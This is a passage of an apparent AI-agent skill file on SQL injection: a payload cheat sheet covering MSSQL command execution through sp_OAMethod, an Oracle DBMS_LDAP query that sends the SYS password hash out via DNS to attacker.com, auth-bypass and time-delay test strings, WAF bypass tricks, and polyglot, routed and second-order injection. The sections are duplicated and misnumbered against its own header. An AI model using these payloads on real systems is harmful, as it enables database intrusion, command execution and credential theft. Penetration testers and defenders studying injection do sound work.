# sqli-sql-injection — 全文续篇

> 主卡保留前 12 节；本文件从第 13 节起。原文件：`/root/.hermes/skills/security/sqli-sql-injection/SKILL.md`

## 11. STORED PROCEDURE ABUSE

### MSSQL — sp_OAMethod (COM automation)
```sql
DECLARE @o INT
EXEC sp_OACreate 'wscript.shell', @o OUT
EXEC sp_OAMethod @o, 'run', NULL, 'cmd.exe /c whoami > C:\out.txt'
```

### Oracle — DBMS_LDAP (outbound LDAP = DNS exfil)
```sql
SELECT DBMS_LDAP.INIT((SELECT password FROM dba_users WHERE username='SYS')||'.attacker.com',389) FROM dual
```

---

## 12. QUICK REFERENCE — INJECTION TEST STRINGS

```
'                          -- break string context
''                         -- escaped quote (test handling)
' OR 1=1--                 -- auth bypass attempt  
' OR 'a'='a               -- alternate auth bypass
'; SELECT 1--             -- statement termination
' UNION SELECT NULL--     -- UNION test
' AND 1=1--               -- boolean true
' AND 1=2--               -- boolean false (different response → injectable)
1; WAITFOR DELAY '0:0:3'-- -- MSSQL time delay
1 AND SLEEP(3)--          -- MySQL time delay
1 AND 1=dbms_pipe.receive_message(('a'),3)-- -- Oracle time delay
```

---

## 13. WAF BYPASS MATRIX

| Technique | Blocked | Bypass |
|---|---|---|
| Space filtered | `SELECT * FROM` | `SELECT/**/*//**/FROM`, `SELECT%0a*%0aFROM` |
| Comma filtered | `UNION SELECT 1,2,3` | `UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c` |
| Quote filtered | `'admin'` | `0x61646D696E` (hex), `CHAR(97,100,109,105,110)` |
| OR/AND filtered | `OR 1=1` | <code>&#124;&#124;1=1</code>, `&&1=1`, `DIV 0` |
| = filtered | `id=1` | `id LIKE 1`, `id REGEXP '^1$'`, `id IN (1)`, `id BETWEEN 1 AND 1` |
| SELECT filtered | | Use `handler` (MySQL), `PREPARE`+hex, or stacked queries |
| information_schema filtered | | `mysql.innodb_table_stats`, `sys.schema_table_statistics` |

Additional WAF bypass patterns:

- Polyglot: `SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/`
- Routed injection: `1' UNION SELECT 0x(inner_payload_hex)-- -` where inner payload is another full query hex-encoded
- Second Order: inject into storage, trigger when data is used in another query later
- PDO emulated prepare: when `PDO::ATTR_EMULATE_PREPARES=true`, stacked queries work even with parameterized-looking code

---

## 14. WAF BYPASS MATRIX

### No-Space Bypass
```sql
SELECT/**/username/**/FROM/**/users
SELECT(username)FROM(users)
```

### No-Comma Bypass
```sql
-- UNION with JOIN instead of comma:
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c
-- SUBSTRING alternative: SUBSTRING('abc' FROM 1 FOR 1)
-- LIMIT alternative: LIMIT 1 OFFSET 0
```

### Polyglot Injection
```sql
SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Routed Injection
```sql
-- First query returns string used as input to second query:
' UNION SELECT CONCAT(0x222c,(SELECT password FROM users LIMIT 1))--
-- The returned value becomes part of another SQL context
```

### Second-Order Injection
```
-- Step 1: Register username: admin'--
-- Step 2: Trigger password change (uses stored username in SQL)
-- UPDATE users SET password='new' WHERE username='admin'--'
```

### PDO / Prepared Statement Edge Cases
```php
// Unsafe even with PDO when query structure is dynamic:
$pdo->query("SELECT * FROM " . $_GET['table']);
// Or when using emulated prepares with multi-query:
$pdo->setAttribute(PDO::ATTR_EMULATE_PREPARES, true);
```

### Entry Point Detection (Unicode tricks)
```
U+02BA ʺ (modifier letter double prime) → "
U+02B9 ʹ (modifier letter prime) → '
%%2727 → %27 → '
```

